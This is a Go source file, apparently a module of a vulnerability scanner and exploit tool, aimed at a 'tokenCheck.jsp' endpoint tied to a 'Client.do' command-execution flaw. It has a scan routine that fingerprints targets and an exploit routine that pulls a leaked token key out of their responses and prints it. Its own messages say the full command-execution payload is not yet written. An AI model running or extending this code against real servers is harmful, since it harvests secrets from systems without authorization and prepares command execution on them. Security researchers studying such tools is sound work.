package vulners

import (
	"github.com/fatih/color"
	"regexp"
	"strings"
)

type Wm01 struct {
}

func (s *Wm01) Scan(targetUrl string) {
	vulnerable, err := Wm01scancore(targetUrl)
	if err != nil {
		color.Red("[x]请求异常！")
		return
	}
	if vulnerable {
		color.Green("[Wm01] 存在Client.do 命令执行[数据包过于复杂还没写]")
	} else {
		color.White("[Wm01] 不存在Client.do 命令执行[数据包过于复杂还没写]")
	}
}

func (*Wm01) Exploit(targetUrl string) {
	runResult, err := Wm01runcore(targetUrl)
	if err != nil {
		color.Red("[x]漏洞利用异常！")
		return
	}
	if runResult != "" {
		color.Green(runResult)
	} else {
		color.White("[!]漏洞利用无返回结果")
	}
}

func Wm01scancore(targetUrl string) (bool, error) {
	url := "/clusterupgrade/tokenCheck.jsp"
	resp, err := baseClient.NewRequest().
		SetHeader("Content-Type", "application/x-www-form-urlencoded").
		Get(targetUrl + url)
	if err != nil {
		return false, err
	}
	resContent := resp.String()
	if strings.Contains(resContent, "key") {
		return true, nil
	} else {
		return false, nil
	}
}

func Wm01runcore(targetUrl string) (string, error) {
	url := "/clusterupgrade/tokenCheck.jsp"
	resp, err := baseClient.NewRequest().
		SetHeader("Content-Type", "application/x-www-form-urlencoded").
		Get(targetUrl + url)
	if err != nil {
		return "", err
	}
	resContent := resp.String()

	r, err := regexp.Compile("key\":\"([\\s\\S]*?)\"}")
	if err != nil {
		return "", nil
	}
	result := strings.Replace(r.FindString(resContent), "\"", "", -1)
	result = strings.Replace(result, "}", "", -1)
	if strings.Contains(resContent, "key") {
		return "存在tokenCheck接口，需自行构造token手工利用\n" + result, nil
	} else {
		return "", nil
	}
}
